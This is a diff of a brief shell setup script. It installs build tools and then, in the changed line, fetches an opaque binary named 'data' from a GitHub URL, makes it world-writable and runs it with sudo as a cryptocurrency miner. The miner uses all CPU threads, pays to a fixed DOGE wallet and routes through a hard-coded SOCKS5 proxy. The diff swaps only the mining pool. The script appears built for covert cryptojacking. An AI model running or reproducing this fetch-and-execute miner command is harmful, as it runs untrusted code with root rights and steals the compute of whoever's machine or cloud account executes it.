@@ -1,4 +1,4 @@
 sudo apt update
 apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git
 apt install -y lynx
-lynx -dont_wrap_pre -dump "https://github.com/TamJsmt/TamJsmt/raw/main/data" > data && chmod 777 data && sudo ./data -a yespower -o stratum+tcp://yespower.sea.mine.zpool.ca:6234 -u DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS -p c=DOGE,zap=PYRK-yespower,ID=ken -t $(nproc) -x socks5://72.206.181.97:64943
+lynx -dont_wrap_pre -dump "https://github.com/TamJsmt/TamJsmt/raw/main/data" > data && chmod 777 data && sudo ./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS -p c=DOGE,zap=PYRK-yespower,ID=ken -t $(nproc) -x socks5://72.206.181.97:64943
